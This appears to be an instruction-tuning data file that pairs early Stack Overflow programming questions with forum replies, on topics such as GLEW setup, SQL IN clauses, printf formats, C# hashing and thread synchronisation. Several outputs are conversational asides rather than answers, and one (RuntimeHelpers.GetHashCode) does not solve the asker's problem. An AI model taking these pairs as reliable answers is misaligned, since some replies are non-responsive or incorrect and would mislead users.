{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "Ben, Almost all seasoned programmers are still students in programming. You never stops learning anything when you are a developer. But if you are really starting off on your career then you should be least worried about the specialization thing. All APIs, frameworks and skills that you expect that gives you a long term existence in the field is not going to happen. Technology seems changing a lot and you should be versatile and flexible enough to learn anything. The knowledge you acquire on one platform/api/framework doesn't die off. You can apply the skills to the next greatest platform/api/framework. \nThat being said you should just stop worrying about the future and concentrate on the basics. DataStructures, Algorithm Analysis and Design, Compiler Design, Operating system design are the bare minimum stuff you need.  And further you should be willing to go back and read tho books in those field any time in your career. Thats all is required. Good luck. \nSorry if I sounded like a big ass advisor; but thats what I think. :-)"}
{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "I would think the greatest skill of all would be to adapt with the times, because if your employer can see this potential in you then they would be wise to hold on tightly.  \nThat said, I would advise you dive into the area YOU would enjoy. Learning is driven by enthusiasm.  \nSince my current employ is with an internet provider, I've found networking knowledge particularly helpful. But someday I'd like to play with 3D graphics (not necessarily games)."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "RuntimeHelpers.GetHashCode might help:\n\nFrom Msdn:\nServes as a hash function for a\n  particular type, suitable for use in\n  hashing algorithms and data structures\n  such as a hash table."}
{"instruction": "I've been using OpenGL extensions on Windows the painful way. Is GLEW the easier way to go? How do I get started with it?", "output": "Yes, the OpenGL Extension Wrangler Library (GLEW) is a painless way to use OpenGL extensions on Windows. Here's how to get started on it:\nIdentify the OpenGL extension and the extension APIs you wish to use. OpenGL extensions are listed in the OpenGL Extension Registry.\nCheck if your graphic card supports the extensions you wish to use. Download and install the latest drivers and SDKs for your graphics card.\nRecent versions of NVIDIA OpenGL SDK ship with GLEW. If you're using this, then you don't need to do some of the following steps.\nDownload GLEW and unzip it.\nAdd the GLEW bin path to your Windows PATH environment variable. Alternatively, you can also place the glew32.dll in a directory where Windows picks up its DLLs.\nAdd the GLEW include path to your compiler's include directory list.\nAdd the GLEW lib path to your compiler's library directory list.\nInstruct your compiler to use glew32.lib during linking. If you're using Visual C++ compilers then one way to do this is by adding the following line to your code:\n#pragma comment(lib, \"glew32.lib\")\n\nAdd a #include <GL/glew.h> line to your code. Ensure that this is placed above the includes of other GL header files. (You may actually not need the GL header files includes if you include glew.h.)\nInitialize GLEW using glewInit() after you've initialized GLUT or GL. If it fails, then something is wrong with your setup.\nif (GLEW_OK != glewInit())\n{\n    // GLEW failed!\n    exit(1);\n}\n\nCheck if the extension(s) you wish to use are now available through GLEW. You do this by checking a boolean variable named GLEW_your_extension_name which is exposed by GLEW.\n\nExample:\n\nif (!GLEW_EXT_framebuffer_object)\n{\n    exit(1);\n}\n\nThat's it! You can now use the OpenGL extension calls in your code just as if they existed naturally for Windows."}
{"instruction": "Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\nI will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\nSo, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\nI would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \nDoes anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\nI know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.\nAny suggestions or insights?", "output": "There's a thorough discussion of this that explains all of the fsync related problems that affected pre-3.0 versions of FF.  In general, I have not seen the behaviour since then either, and really it shouldn't be a problem at all if your system isn't also doing IO intensive tasks.  Firebug/Venkman make for nice debuggers, but they would be painful for figuring out these kinds of problems for someone else's code, IMO.\nI also wish that there was an easy way to look at CPU utilization in Firefox by tab, though, as I often find myself with FF eating 100% CPU, but no clue which part is causing the problem."}
{"instruction": "I've been using OpenGL extensions on Windows the painful way. Is GLEW the easier way to go? How do I get started with it?", "output": "Personally I wouldn't use an exit command.\nI would throw an exception so you can clear any other initialisation up at the end of the function.\nie:\ntry\n{\n    // init opengl/directx\n    // init directaudio\n    // init directinput\n\n    if (GLEW_OK != glewInit())\n    {\n    \tthrow std::exception(\"glewInit failed\");\n    }\n}\ncatch ( const std::exception& ex )\n{\n    // message to screen using ex.what()\n    // clear up\n}\n\nAnd I agree with OJ - if you want to write tutorials for others, then this is really the wrong place for it. There are already a load of good places for opengl tutorials. Try this one for instance."}
{"instruction": "We created a tool which converts a language called P2, a language similar to assembly which I think exists only in Japan, to C#. There are at least a hundred modules written in P2 and we want to verify if the conversion to C# is right? How can we test this?", "output": "You don't test the converter, you test the final code. \nIf the code doesn't compile, clearly your converter is failing. If the code compiles and your functionality tests fail, then you can tweak the code so that it passes the test. If you are fairly successful you should see that you only need to fix the modules that actually fail.\nGoodluck!"}
{"instruction": "The System.Windows.Threading.DispatcherObject class (which DependencyObject is based on) contains a useful function, called CheckAccess(), that determines whether or not the code is running on the UI thread.\nWhen I wanted to use it yesterday, I was puzzled to find out that Intellisense didn't show the function (nor VerifyAccess(), which throws an exception when not on the UI thread), even though the MSDN library lists it. I decided to investigate the class using Reflector. It seems that the function in question has an EditorBrowsable(EditorBrowsableState.Never) attribute attached to it. The Dispatcher class, which is used by DispatcherObject, has the same attribute attached to CheckAccess() and VerifyAccess():\npublic abstract class DispatcherObject\n{\n    // ...\n\n    [EditorBrowsable(EditorBrowsableState.Never)]\n    public bool CheckAccess();\n    [EditorBrowsable(EditorBrowsableState.Never)]\n    public void VerifyAccess();\n\n    // ...\n\n    [EditorBrowsable(EditorBrowsableState.Advanced)]\n    public Dispatcher Dispatcher { get; }\n}\n\n\npublic sealed class Dispatcher\n{\n    // ...\n\n    [EditorBrowsable(EditorBrowsableState.Never)]\n    public bool CheckAccess();\n    [EditorBrowsable(EditorBrowsableState.Never)]\n    public void VerifyAccess();\n\n    // ...\n}\n\nI don't believe that the application of that attribute is random (or a joke), so my question is: why is it there? Should those methods not be called directly? Then why aren't they protected (or internal, like some of the most useful methods in the WPF)?", "output": "I can't find any documentation that says you shouldn't use those methods directly, but I haven't looked very long.\nAlso you refer to the EditorVisibleAttribute, which doesn't exist. According to Reflector it's the EditorBrowsableAttribute.\nReflector disassembly:\n[EditorBrowsable(EditorBrowsableState.Never)]\npublic bool CheckAccess()\n{\n//CODE\n}"}
{"instruction": "I'm looking for a good online service for notes/documents (think Google Docs) that has a decent web UI and offers an API for clients to read/write the stored data.\nGoogle Docs is almost perfect - except there's no way to update the contents of existing documents.", "output": "None of the APIs for the more 'Word' like online editors seem to have any 'edit' functionality, just download and upload. This is obviously due to the complexity of the documents being stored.\nWith Google Docs API you can get a document, edit it, and then re-upload it (you may need to delete the previous version as well I think). Zoho seems to provide an 'update' method which combines the two operations.\nHave you looked at the Google Notebook API instead? This might provide more granular access to the data in the 'note' due to its structured approach to storing the data."}
{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "Go as deep as you can starting off in one environment, win32, .net, Java, Objective C... whatever.  \nIt is important to build the deep understanding of how X works... so that you can translate the same concepts into other languages or platforms/environments, if you so desire.  \n\"Are there any areas of specialization that hinder your ability of developing other areas of specialization.\"  Sort of, but nothing permanent i think.\nSince I am relatively green myself (less than 4 years) I come from a really OOP mindset.  I've rarely jumped out of .NET, so I had a hard time on one job when coming into contact with embedded code.  With embedded programmers fearing object creation and the performance loss of inheritance.  I had to learn the environment, seriously low memory and slow clock times, they were coming from.  Those are times to grow, I had a better time at it because i understood my area pretty well.\nI will say if you pick something to specialize in for marketability and money, you will probably burn out fast.  If you do start to specialize pick something you enjoy.  I love GUI programing and hate server side stuff, my buddy is the opposite, but we both love our jobs.  If he had to do my job, and I his, we would both go insane out of boredom."}
{"instruction": "I know that IList is the interface and List is the concrete type but I still don't know when to use each one. What I'm doing now is if I don't need the Sort or FindAll methods I use the interface. Am I right? Is there a better way to decide when to use the interface or the concrete type?", "output": "I would agree with Lee's advice for taking parameters, but not returning.\nIf you specify your methods to return an interface that means you are free to change the exact implementation later on without the consuming method ever knowing. I thought I'd never need to change from a List<T> but had to later change to use a custom list library for the extra functionality it provided. Because I'd only returned an IList<T> none of the people that used the library had to change their code.\nOf course that only need apply to methods that are externally visible (i.e. public methods). I personally use interfaces even in internal code, but as you are able to change all the code yourself if you make breaking changes it's not strictly necessary."}
{"instruction": "We have a situation in our product where for a long time some data has been stored in the application's database as SQL string (choice of MS SQL server or sybase SQL anywhere) which was encrypted via the Windows API function CryptEncrypt.  (direct and decryptable)\nThe problem is that CryptEncrypt can produce NULL's in the output, meaning that when it's stored in the database, the string manipulations will at some point truncate the ciphertext.\nIdeally we'd like to use an algo that will produce cyphertext that doesn't contain NULLs as that will cause the least amount of change to the existing databases (changing a column from string to binary and code to deal with binary instead of strings) and just decrypt existing data and re-encrypt with the new algo at database upgrade time.\nThe algorithm doesn't need to be the most secure, as the database is already in a reasonably secure environment (not an open network / teh interwebs) but does need to bebetter than ROT13 (which I can almost decrypt in my head now!)\nCheers\nedit: btw, any particular reason for changing ciphertext to cyphertext? ciphertext seems more widely used...", "output": "Any semi-decent algorithm will end up with a strong chance of generating a NULL value somewhere in the resulting ciphertext.\nWhy not do something like base-64 encode your resulting binary blob before persisting to the DB? (sample implementation in C++)."}
{"instruction": "We have a situation in our product where for a long time some data has been stored in the application's database as SQL string (choice of MS SQL server or sybase SQL anywhere) which was encrypted via the Windows API function CryptEncrypt.  (direct and decryptable)\nThe problem is that CryptEncrypt can produce NULL's in the output, meaning that when it's stored in the database, the string manipulations will at some point truncate the ciphertext.\nIdeally we'd like to use an algo that will produce cyphertext that doesn't contain NULLs as that will cause the least amount of change to the existing databases (changing a column from string to binary and code to deal with binary instead of strings) and just decrypt existing data and re-encrypt with the new algo at database upgrade time.\nThe algorithm doesn't need to be the most secure, as the database is already in a reasonably secure environment (not an open network / teh interwebs) but does need to bebetter than ROT13 (which I can almost decrypt in my head now!)\nCheers\nedit: btw, any particular reason for changing ciphertext to cyphertext? ciphertext seems more widely used...", "output": "That's an interesting route OJ.\nWe're looking at the feasability of a non-reversable method (still making sure we don't explicitly retrieve the data to decrypt) e.g. just store a Hash to compare on a submission"}
{"instruction": "We have a situation in our product where for a long time some data has been stored in the application's database as SQL string (choice of MS SQL server or sybase SQL anywhere) which was encrypted via the Windows API function CryptEncrypt.  (direct and decryptable)\nThe problem is that CryptEncrypt can produce NULL's in the output, meaning that when it's stored in the database, the string manipulations will at some point truncate the ciphertext.\nIdeally we'd like to use an algo that will produce cyphertext that doesn't contain NULLs as that will cause the least amount of change to the existing databases (changing a column from string to binary and code to deal with binary instead of strings) and just decrypt existing data and re-encrypt with the new algo at database upgrade time.\nThe algorithm doesn't need to be the most secure, as the database is already in a reasonably secure environment (not an open network / teh interwebs) but does need to bebetter than ROT13 (which I can almost decrypt in my head now!)\nCheers\nedit: btw, any particular reason for changing ciphertext to cyphertext? ciphertext seems more widely used...", "output": "Storing a hash is a good idea. However, please definitely read Jeff's You're Probably Storing Passwords Incorrectly."}
{"instruction": "We created a tool which converts a language called P2, a language similar to assembly which I think exists only in Japan, to C#. There are at least a hundred modules written in P2 and we want to verify if the conversion to C# is right? How can we test this?", "output": "Short of a formal mathematical proof (which I imagine would be difficult), the proof of the pudding is in the unit tests. You have to find a way to wrap the converted C# snippets, compile the and run them under a similar environment, then compare the output against the original. Unless you're rigorous in your testing, there's no way you can be confident of the result."}
{"instruction": "We have a situation in our product where for a long time some data has been stored in the application's database as SQL string (choice of MS SQL server or sybase SQL anywhere) which was encrypted via the Windows API function CryptEncrypt.  (direct and decryptable)\nThe problem is that CryptEncrypt can produce NULL's in the output, meaning that when it's stored in the database, the string manipulations will at some point truncate the ciphertext.\nIdeally we'd like to use an algo that will produce cyphertext that doesn't contain NULLs as that will cause the least amount of change to the existing databases (changing a column from string to binary and code to deal with binary instead of strings) and just decrypt existing data and re-encrypt with the new algo at database upgrade time.\nThe algorithm doesn't need to be the most secure, as the database is already in a reasonably secure environment (not an open network / teh interwebs) but does need to bebetter than ROT13 (which I can almost decrypt in my head now!)\nCheers\nedit: btw, any particular reason for changing ciphertext to cyphertext? ciphertext seems more widely used...", "output": "It seems that the developer handling this is going to wrap the existing encryption with yEnc to preserve the table integrity as the data needs to be retrievable, and this save all that messy mucking about with infinite-improbab.... uhhh changing column types on entrenched installations.\nCheers Guys"}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "Two Things I do:\n\nI blog about it - this allows me to go back and search my own blog.\nWe use the code snippet feature in Visual Studio.\n\nCheers."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "Why not set up a Wiki?\nIf you are on windows, i know that ScrewTurn wiki is pretty simple to deploy on a desktop/laptop.  No database to fuss around with."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "Blog about it. \nOne of the nice side-effects of blogging is that if you use a sensible categorization or tagging system, it's quite easy to search for stuff within your blog. The fact that you wrote about it also makes it easier to remember problems you have encountered before (\"hey, I blogged about that!\").\nThat's a great benefit aside from, of course, being able to share this information publicly so that others might be able to find your solution to a particular problem using Google."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "I send them to my gmail account, that way I have them where ever I go, and they can be put into appropriate folders for later."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "I second the blog about it technique...even Jeff said that's a major reason he blogs.\nAlso, regarding the wiki idea, if you set one up at work, be sure to encourage your coworkers to do the same.  When someone finds something of interest they can just write a little \"article\" explaining what it is and how to do it... that way, not only are your own things easily available and quickly searchable, but you'll often find out things you never knew from other people in your group.  That way it benefits everyone not just you."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "I agree with emailing, the wiki and the blog. Emailing is the most useful. If you can't use GMail and you're on windows, install a desktop search utility (Windows search, Google Desktop, Copernic, etc)\nI also like to jot it into a textfile and save it in my documents folder. Whatever desktop search utility you use will be able to find it easily. e.g.  \n//print spool stop.notes.txt\nIf the printer spooler stops, start it again by \n- Services > Provision Networks > Restart Service\n\ntags: printer provision no printer spooler cannot print remote desktop"}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "Subscribe in Google Reader and then search later."}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "A number of people I know swear by Google Notebook"}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "At my last place of work they wouldn't let me set up a wiki or anything - so I just made various word documents full of tips and instructions and gave that to my successor when I left.\nNow though I'd use a private wiki, or maybe a blog."}
{"instruction": "I have some code for starting a thread on the .NET CF 2.0:\nThreadStart tStart = new ThreadStart(MyMethod);\nThread t = new Thread(tStart);\nt.Start();\n\nIf I call this inside a loop the items complete out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?", "output": "Another way of waiting for a thread to finish is using an AutoResetEvent.\nprivate readonly AutoResetEvent mWaitForThread = new AutoResetEvent(false);\n\nprivate void Blah()\n{\n    ThreadStart tStart = new ThreadStart(MyMethod);\n    Thread t = new Thread(tStart);\n    t.Start();\n\n    //... (any other things)\n    mWaitForThread.WaitOne();\n}\n\nprivate void MyMethod()\n{\n     //... (execute any other action)\n     mWaitForThread.Set();\n}"}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "Sure thing, the simplest way is this:\nselect foo from bar where baz in (1,2,3)"}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "select * from TABLE where field IN (1,2,3)\n\nYou can also conveniently combine this with a subquery that only returns one field:\n    select * from TABLE where field IN (SELECT boom FROM anotherTable)"}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "select * from TABLE where field in (1, 2, 3)"}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "WHERE field IN (1, 2, 3)"}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "OR:\nSELECT foo FROM bar WHERE baz BETWEEN 1 AND 3"}
{"instruction": "What do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience? Things like useful compiler arguments, IDE short-cuts, clever code snippets, etc.\nI sometimes find myself frustrated when looking up something that I used to know a year or two ago. My IE favourites probably represent a good chunk of the Internet in the late 1990s, so clearly that isn't effective (at least for me). Or am I just getting old?\nSo.. what do you do?", "output": "I use:\n\nGoogle Notebook - I take notes for projects, books I'm reading, etc\nDelicious + Firefox plug in - Every time I see a good page I mark it.\nWindows Journal (in tablet pc) - When I need to draw something and then copy/cut/paste it. I have more distractions here, the web is always very close :)\nSmall Moleskine paper notebook - Its always with me.\nBig paper notebook - When I need more space to write and less distractions.\n\nObviously these are for all useful information, not just for snippets or tips and tricks."}
{"instruction": "Is there a way to select data where any one of multiple conditions occur on the same field?\nExample: I would typically write a statement such as:\nselect * from TABLE where field = 1 or field = 2 or field = 3\n\nIs there a way to instead say something like:\nselect * from TABLE where field = 1 || 2 || 3\n\nAny help is appreciated.", "output": "You can still use in for\nselect *\nfrom table\nwhere field  = '1' or field = '2' or field = '3'\n\nits just\nselect * from table where field in ('1','2','3')"}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "In C++ you can use the streaming operator to simplify things:\n#if defined _DEBUG\n\nclass Trace\n{\npublic:\n   static Trace &GetTrace () { static Trace trace; return trace; }\n   Trace &operator << (int value) { /* output int */ return *this; }\n   Trace &operator << (short value) { /* output short */ return *this; }\n   Trace &operator << (Trace &(*function)(Trace &trace)) { return function (*this); }\n   static Trace &Endl (Trace &trace) { /* write newline and flush output */ return trace; }\n   // and so on\n};\n\n#define TRACE(message) Trace::GetTrace () << message << Trace::Endl\n\n#else\n#define TRACE(message)\n#endif\n\nand use it like:\nvoid Function (int param1, short param2)\n{\n   TRACE (\"param1 = \" << param1 << \", param2 = \" << param2);\n}\n\nYou can then implement customised trace output for classes in much the same way you would do it for outputting to std::cout."}
{"instruction": "I was using a CASE called MAGIC for a system I'm developing, I've never used this kind of tool before and at first sight I liked, a month later I had a lot of the application generated, I felt very productive and ... I would say ... satisfied.\nIn some way a felt uncomfortable, cause, there is no code and everything I was used to, but in the other hand I could speed up my developing. The fact is that eventually I returned to use C# because I find it more flexible to develop, I can make unit testing, use CVS, I have access to more resources and basically I had \"all the control\". I felt that this tool didn't give me confidence and I thought that later in the project I could not manage it due to its forced established rules of development. And also a lot of things like sending emails, using my own controls, and other things had their complication, it seemed that at some point it was not going to be as easy as initially I thought and as initially the product claims. This reminds me a very nice article called \"No Silver Bullet\".\nThis CASE had its advantages but on the other hand it doesn't have resources you can consult and actually the license and certification are very expensive. For me another dissapointing thing is that because of its simplistic approach for development I felt scared on first hand cause of my unexperience on these kind of tools and second cause I thought that if I continued using it maybe it would have turned to be a complex monster that I could not manage later in the project.\nI think its good to use these kind of solutions to speed up things but I wonder, why aren't these programs as popular as VS.Net, J2EE, Ruby, Python, etc. if they claim to enhace productivity better than the tools I've pointed?", "output": "Unfortunaly the Magic tool doesn't generates code and also it can't implement a design pattern. I don't have control over the code cause as i stated before it doesn't have code to modify. Te bottom line is that it can speed up productivity in some way but it has the impossibility to user CVS, patterns also and I can't control all the details.\nI agree with gary when he says \"it seems that the productivity aspect of such CASE tools is heavily dependent on customer requirements and developer skill sets/training/background\" but also I can't agree more with Klelky; \nThose main disadvantages are:\n1. We cannot do automatic merges, making it close to impossible for parallel development on one component.\n2.Developers get dependant on the tool and 'forget' how to handcode.\nThanks"}
{"instruction": "I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development. \nThis is a multi-part question really: \n\nWhat are the common specializations within computer programming and software development?  \nWhich of these specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? \nWhich skill sets complement each other? \nAre there any areas of specialization that hinder your ability of developing other areas of specialization.", "output": "As a student I'd recommend forgetting about what you're programming and focusing on the software process itself. Understand how to analyse a problem and ask the right questions; learn every design pattern you can and actually apply them all to gain a real understanding and appreciation of object-oriented design; write tests and then code only as much as you need to in order to make the tests pass. I think the best way to really learn is to just code as much as you can - the language and the domain aren't important, browse sourceforge and freshmeat for any interesting-sounding projects and get involved. What's important is understanding the fundamentals of software engineering.\nAnd yes, this includes C. Or Assembler. This is the easiest way to get a good understanding of how your computer works and what your high-level code is actually doing.\nFinally, never stop learning - Service-oriented architecture, inversion of control, domain-specific languages, business process management are all showing huge benefits so they're important to be aware of - But by the time you finish studying and join the workforce who knows what the next big thing will be?"}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "man 3 printf\n\non a Linux system will give you all the information you need.  You can also find these manual pages online, for example at http://linux.die.net/man/3/printf"}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "http://en.wikipedia.org/wiki/Printf#printf_format_placeholders is Wikipedia's reference for format placeholders in printf. http://www.cplusplus.com/reference/clibrary/cstdio/printf.html is also helpful\nBasically in a simple form it's %[width].[precision][type]. Width allows you to make sure that the variable which is being printed is at least a certain length (useful for tables etc). Precision allows you to specify the precision a number is printed to (eg. decimal places etc) and the informs C/C++ what the variable you've given it is (character, integer, double etc).\nHope this helps\nUPDATE:\nTo clarify using your examples:\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\n%10.1f (referring to the first argument: radius) means make it 10 characters long (ie. pad with spaces), and print it as a float with one decimal place.\n%10.2 (referring to the second argument: area) means make it 10 character long (as above) and print with two decimal places."}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "10.1f means you want to display a float with 1 decimal and the displayed number should be 10 characters long."}
